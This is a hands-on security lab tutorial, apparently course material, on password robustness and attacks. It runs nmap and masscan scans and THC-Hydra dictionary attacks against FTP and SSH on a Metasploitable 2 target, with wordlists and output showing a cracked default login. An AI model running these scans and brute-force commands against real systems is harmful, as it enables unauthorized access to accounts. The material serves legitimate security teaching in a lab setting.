# Attacks on Password-based Systems  <!-- omit in toc -->

## Table of Contents  <!-- omit in toc -->

- [Introduction](#introduction)
- [Understanding Passwords](#understanding-passwords)
  - [Check your passwords](#check-your-passwords)
  - [Massive list of passwords](#massive-list-of-passwords)
  - [Checking for password robustness](#checking-for-password-robustness)
- [Attacks on Passwords](#attacks-on-passwords)
  - [Looking for password-based services](#looking-for-password-based-services)
  - [Using THC-Hydra](#using-thc-hydra)
  - [Attacking FTP service with THC-Hydra](#attacking-ftp-service-with-thc-hydra)
  - [Attacking SSH service with THC-Hydra](#attacking-ssh-service-with-thc-hydra)
  - [Attacking Web application with THC-Hydra](#attacking-web-application-with-thc-hydra)

## Introduction

This is lab where you can test some content related with the usage of passwords. You'll find some examples where you can test if your password is compromised, or how robust are your passwords.

In order to use this lab, it is recommended to use:

- a web browser
- [Kali Linux](https://www.kali.org/), with some tools installed
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/) VM (used as a target).

## Understanding Passwords

This part is useful for checking the security of passwords and to understand its robustness.

### Check your passwords

There have been some data leakages on the Internet that contain a massive amount of accounts, with the passwords of millions and millions of users. [Troy Hunt](https://www.troyhunt.com/), a security researcher, as created a web site called "[have I been pwned](https://haveibeenpwned.com/)" that allows any user to look for an email address or telephone number, that might be part of an existing data leak.

![haveibeenpwned](assets/picture01.png)

Using this web site try to look for the following:

- Look to see if some of your accounts have been compromised (also look at the details of those accounts);
- Look at the amazing [list of Pwned web sites](https://haveibeenpwned.com/PwnedWebsites). Found anything [interesting](https://haveibeenpwned.com/PwnedWebsites#TAPAirPortugal)?
- Look for information online about the most recent Facebook data breach (2021).

### Massive list of passwords

There are multiple sites that aggregate lots of passwords. These passwords can be used to conduct dictionary attacks, that test all the existing passwords to check if some of them works.

One of the most well know data breach that involved non-encrypted user accounts was the [Rockyou](https://techcrunch.com/2009/12/14/rockyou-hack-security-myspace-facebook-passwords/?guccounter=1) social application site, mainly developing widgets for Facebook. Rockyou sufered [a data breach](https://en.wikipedia.org/wiki/RockYou) that resulted in the exposure of 32 million user accounts.

- [Common Password List ( rockyou.txt )](https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt)
- [Direct download](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
) of the Rockyou passwords
- [Seclists](https://github.com/danielmiessler/SecLists)

### Checking for password robustness

One of the most important measures in terms of security for a password is its robustness. One way to determine the password robustness is through the measure of the [password entropy](https://www.okta.com/identity-101/password-entropy/). Password entropy predicts how difficult a given password would be to crack through guessing, brute force or dictionary attacks or other common methods. Entropy is measured in bits.

Just for checking the entropy of the passwords lets do the following:

1. Visit the web site of GeneratePasswords and look and the [password entropy calculation calculation formula](https://generatepasswords.org/how-to-calculate-entropy/);
2. Also look at [why the password strength meters are not that great](https://generatepasswords.org/why-password-strength-meters-are-not-so-great-after-all/) (those you find on most websites);
3. Check the entropy of the different types of passwords using a [password strength calculator](http://www.bee-man.us/computer/password_strength.html);
4. Check on [EFF Dice-Generate Passphrases](https://www.eff.org/dice). Look at the [wordlist dictionary](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt). Try the proposed process to create a great passphrase;
5. Also look at the [Diceware Passphrase web site](https://theworld.com/~reinhold/diceware.html);
6. Finally try to create a passwords/passphrases and [check its strength](https://bitwarden.com/password-strength/).

## Attacks on Passwords

Let us simulate a situation in which we have an attacker that is going to try to exploit a victim. For the attacker, [Kali Linux](https://www.kali.org/) will be used. For the victim, we will use the [Metasploitable 2](https://sourceforge.net/projects/metasploitable/).

Lets assume that the victim has the following email address: **192.168.8.148**.

### Looking for password-based services 

Next we are going to analyze the system either using "`nmap`" or "`massscan`". Let's use `nmap` first:

    nmap 192.168.8.142

And obtain the following results:

    Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 23:56 WET
    Nmap scan report for 192.168.8.142
    Host is up (0.0046s latency).
    Not shown: 977 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    23/tcp   open  telnet
    25/tcp   open  smtp
    53/tcp   open  domain
    80/tcp   open  http
    111/tcp  open  rpcbind
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    512/tcp  open  exec
    513/tcp  open  login
    514/tcp  open  shell
    1099/tcp open  rmiregistry
    1524/tcp open  ingreslock
    2049/tcp open  nfs
    2121/tcp open  ccproxy-ftp
    3306/tcp open  mysql
    5432/tcp open  postgresql
    5900/tcp open  vnc
    6000/tcp open  X11
    6667/tcp open  irc
    8009/tcp open  ajp13
    8180/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds

And now let's use the `massscan` tool (it requires it to run as `sudo`):

    sudo masscan 192.168.8.142 --top-ports

Resulting in:

    Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-05 00:00:46 GMT
    Initiating SYN Stealth Scan
    Scanning 1 hosts [1000 ports/host]
    Discovered open port 21/tcp on 192.168.8.142                                   
    Discovered open port 1524/tcp on 192.168.8.142                                 
    Discovered open port 80/tcp on 192.168.8.142                                   
    Discovered open port 1099/tcp on 192.168.8.142                                 
    Discovered open port 8180/tcp on 192.168.8.142                                 
    Discovered open port 111/tcp on 192.168.8.142                                  
    Discovered open port 22/tcp on 192.168.8.142                                   
    Discovered open port 8009/tcp on 192.168.8.142                                 
    Discovered open port 5900/tcp on 192.168.8.142                                 
    Discovered open port 2049/tcp on 192.168.8.142                                 
    Discovered open port 53/tcp on 192.168.8.142                                   
    Discovered open port 139/tcp on 192.168.8.142                                  
    Discovered open port 514/tcp on 192.168.8.142                                  
    Discovered open port 6667/tcp on 192.168.8.142                                 
    Discovered open port 6000/tcp on 192.168.8.142                                 
    Discovered open port 512/tcp on 192.168.8.142                                  
    Discovered open port 25/tcp on 192.168.8.142                                   
    Discovered open port 5432/tcp on 192.168.8.142                                 
    Discovered open port 2121/tcp on 192.168.8.142                                 
    Discovered open port 513/tcp on 192.168.8.142                                  
    Discovered open port 445/tcp on 192.168.8.142                                  
    Discovered open port 3306/tcp on 192.168.8.142                                 
    Discovered open port 23/tcp on 192.168.8.142 

So it was possible to conclude that there are plenty of services open on the machine. To this point we can understand the exposition degree of the victim. It is possible to understand there are services such as **ftp**, **ssh**, and **http** which are running on the machine.

### Using THC-Hydra

[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) is a tool that was developed for security researchers to help testing the robustness of password-based systems. Hydra is a tool to guess/crack valid login/password pairs.

This tool has multiple options. You should look at the help of the function to learn about its functionalities. 

    hydra -h

Which produces the following result. This is simply a part of the output that this command presents.

    Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Hydra supports a large set of protocols and services, such as:

- POP3
- FTP
- HTTP-GET, HTTP-POST-FORM, HTTP-GET-FORM
- Firebird
- Subversion
- Telnet
- Postgres
- SSH
- Teamspeak
- MySQL
- rexec
- SOCKS5
- SNMP
- NNTP
- ... more.

THC-Hydra can handle the following types os attacks:
- Brute force attacks
- Dictionary attacks
- Parallel attacks (16 threads by default, -t option)
- Check for null, login as password, reversed characters (-e option)
- Attack several different servers

There are also some graphical tools for THC-Hydra, such as `xhydra`. You may install and launch this tool by doing:

    xhydra

![xhydra image](assets/picture02.png)

### Attacking FTP service with THC-Hydra

In the example, we are going to launch a **dictionary attack** against the FCP service of the victim. In order to do this we need to use a word list file (the dictionary) that contain the words to be used as passwords.

We may create that file, or we may use some file downloaded from the Internet (please refer to the first part of this document) or we may also use some of the word list files that are part of Kali Linux. You may find such files on the `/usr/share/wordlists` folder.

It is important to notice that, the bigger the file, the longer will be the processing time of such file.

For demonstration purposes, let's create two files. The first one will be called `users.txt` and will contain a list of possible users:

    root
    admin
    test
    guest
    info
    adm
    mysql
    user
    administrator
    oracle
    ftp
    pi
    puppet
    ansible
    ec2-user
    vagrant
    azureuser

And we will also create a file called `passwords.txt` which will contain the list of most common passwords in 2022:

    123456
    123456789
    qwerty
    password
    12345
    qwerty123
    1q2w3e
    12345678
    111111
    1234567890


If you don't want to create these files, I've created them for you. You can **download here** the [list of users](files/users.txt) and the [list of passwords](files/passwords.txt).

Now, we can start the THC-Hydra to test the FCP service and check if some of the users and passwords match some existing user on the FTP service.

    hydra -v -V -L users.txt -P passwords.txt 192.168.8.142 ftp

`-L` is used to specify the file that contain the usernames, in this case `users.txt`

`-P` is used to specify the file that contain the passwords, in this case `passwords.txt`

`-v` activates the verbose mode

`-V` displays each attempt with a username/password pair

You'll get a similar output to this one:

    ...
    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "123456" - 1 of 187 [child 0] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "123456789" - 2 of 187 [child 1] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "qwerty" - 3 of 187 [child 2] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "password" - 4 of 187 [child 3] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "12345" - 5 of 187 [child 4] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "root" - pass "qwerty123" - 6 of 187 [child 5] (0/0)
    ...

After running the tool, try to **interpret its results** and **check if you were able to find** some valid username/password pair.

You may also run THC-Hydra to just try to do a dictionary attack against a specific username. In this case you have to specify the username and simply use the `passwords.txt` file. The command is similar:

    hydra -v -V -l msfadmin -P passwords.txt 192.168.8.142 ftp

Which results in:

    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-05 16:26:08
    [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:1/p:12), ~1 try per task
    [DATA] attacking ftp://192.168.8.142:21/
    [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "123456" - 1 of 12 [child 0] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "123456789" - 2 of 12 [child 1] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "qwerty" - 3 of 12 [child 2] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "password" - 4 of 12 [child 3] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "12345" - 5 of 12 [child 4] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "qwerty123" - 6 of 12 [child 5] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "1q2w3e" - 7 of 12 [child 6] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "12345678" - 8 of 12 [child 7] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "msfadmin" - 9 of 12 [child 8] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "111111" - 10 of 12 [child 9] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "1234567890" - 11 of 12 [child 10] (0/0)
    [ATTEMPT] target 192.168.8.142 - login "msfadmin" - pass "" - 12 of 12 [child 11] (0/0)
    [21][ftp] host: 192.168.8.142   login: msfadmin   password: msfadmin
    [STATUS] attack finished for 192.168.8.142 (waiting for children to complete tests)
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-05 16:26:13

### Attacking SSH service with THC-Hydra

In this case, we are going to launch a dictionary attack against the SSH service on the victim. The approach is similar to the one presented before, the only difference is just to chance the service name:

    hydra -v -V -L users.txt -P passwords.txt 192.168.8.142 ssh

Did it worked? Why? Try to understand what happened.

### Attacking Web application with THC-Hydra

